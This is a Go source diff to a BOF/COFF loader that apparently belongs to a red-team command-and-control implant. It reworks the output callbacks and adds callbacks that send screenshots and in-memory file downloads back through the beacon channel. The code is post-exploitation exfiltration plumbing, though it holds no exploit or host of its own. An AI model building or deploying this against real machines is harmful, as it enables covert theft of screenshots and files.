@@ -8,6 +8,8 @@
 package boffer
 
 import (
+	"bytes"
+	"encoding/binary"
 	"fmt"
 	"math"
 	"strings"
@@ -233,7 +235,8 @@ func GetCoffOutputForChannel(channel chan<- interface{}) func(int, uintptr, int)
 		}
 		out := memory.ReadBytesFromPtr(data, uint32(length))
 
-		channel <- string(out)
+		channel <- beaconType
+		channel <- []byte(out)
 		return 1
 	}
 }
@@ -245,7 +248,8 @@ func GetCoffPrintfForChannel(channel chan<- interface{}) func(int, uintptr, uint
 		args := []uintptr{arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9}
 
 		result := parsePrintfFormat(fmtStr, args)
-		channel <- result
+		channel <- beaconType
+		channel <- []byte(result)
 		return 0
 	}
 }
@@ -585,4 +589,46 @@ func ToWideChar(src uintptr, dst uintptr, max int32) uintptr {
 	// MultiByteToWideChar returns number of wchar_t
 	// 0 on error is FALSE
 	return ret
+}
+
+// export AxAddScreenshot
+func AxAddScreenshot(channel chan<- interface{}) func(uintptr, uintptr, int) uintptr {
+	return func(note uintptr, data uintptr, length int) uintptr {
+		if length <= 0 {
+			return 0
+		}
+		outNote := memory.ReadCStringFromPtr(note)
+		outData := memory.ReadBytesFromPtr(data, uint32(length))
+
+		buf := new(bytes.Buffer)
+
+		binary.Write(buf, binary.LittleEndian, uint32(len(outNote)))
+		buf.Write([]byte(outNote))
+		buf.Write([]byte(outData))
+
+		channel <- 0x81 // CALLBACK_AX_SCREENSHOT
+		channel <- buf.Bytes()
+		return 1
+	}
+}
+
+// export AxDownloadMemory
+func AxDownloadMemory(channel chan<- interface{}) func(uintptr, uintptr, int) uintptr {
+	return func(filename uintptr, data uintptr, length int) uintptr {
+		if length <= 0 {
+			return 0
+		}
+		outFilename := memory.ReadCStringFromPtr(filename)
+		outData := memory.ReadBytesFromPtr(data, uint32(length))
+
+		buf := new(bytes.Buffer)
+
+		binary.Write(buf, binary.LittleEndian, uint32(len(outFilename)))
+		buf.Write([]byte(outFilename))
+		buf.Write([]byte(outData))
+
+		channel <- 0x82 // CALLBACK_AX_DOWNLOAD_MEM
+		channel <- buf.Bytes()
+		return 1
+	}
 }
